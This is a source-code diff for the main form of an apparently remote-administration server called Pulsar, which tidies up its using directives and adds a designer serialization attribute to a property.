@@ -1,10 +1,15 @@
+using Newtonsoft.Json;
 using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Administration.Actions;
 using Pulsar.Common.Messages.ClientManagement;
+using Pulsar.Common.Messages.ClientManagement.UAC;
+using Pulsar.Common.Messages.ClientManagement.WinRE;
 using Pulsar.Common.Messages.FunStuff;
 using Pulsar.Common.Messages.FunStuff.GDI;
+using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
 using Pulsar.Common.Messages.Preview;
+using Pulsar.Common.Messages.QuickCommands;
 using Pulsar.Common.Messages.UserSupport.MessageBox;
 using Pulsar.Common.Messages.UserSupport.Website;
 using Pulsar.Server.Extensions;
@@ -15,26 +20,23 @@ using Pulsar.Server.Networking;
 using Pulsar.Server.Utilities;
 using System;
 using System.Collections.Generic;
+using System.ComponentModel;
 using System.Diagnostics;
+using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
-using Pulsar.Common.Messages.QuickCommands;
-using System.IO;
-using Newtonsoft.Json;
-using System.Drawing;
-using Pulsar.Common.Messages.Monitoring.VirtualMonitor;
-
-using Pulsar.Common.Messages.ClientManagement.UAC;
-using Pulsar.Common.Messages.ClientManagement.WinRE;
 
 namespace Pulsar.Server.Forms
 {
     public partial class FrmMain : Form
     {
+        [DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
         public PulsarServer ListenServer { get; set; }
+
         private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC
 
         private const int STATUS_ID = 5;
